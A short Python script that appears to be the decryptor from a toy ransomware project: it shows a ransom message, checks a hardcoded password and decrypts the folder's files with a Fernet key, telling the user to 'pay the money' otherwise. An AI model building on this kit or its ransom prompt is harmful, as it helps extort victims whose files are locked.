import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == 'rw.py' or file == 'seckey.key' or file == 'decrypt.py':
        continue
    if os.path.isfile(file):
     files.append(file)

with open("seckey.key","rb") as k :
   secretkey = k.read()

secrete_phrase = "Vishwa"

user_entry = input("Your system is affected by ransomware virus and all files are encryted, you can check. enter password to decrpt : ")

if user_entry == secrete_phrase :
   for file in files :
        with open(file, 'rb') as theFile :
            content = theFile.read()
        decrypted_content = Fernet(secretkey).decrypt(content)
       
        with open(file, 'wb') as theFile :
            theFile.write(decrypted_content)
         
   print("Great files are decrypted.")
else :
   print("Wrong passcode, pay the money to get the right passcode")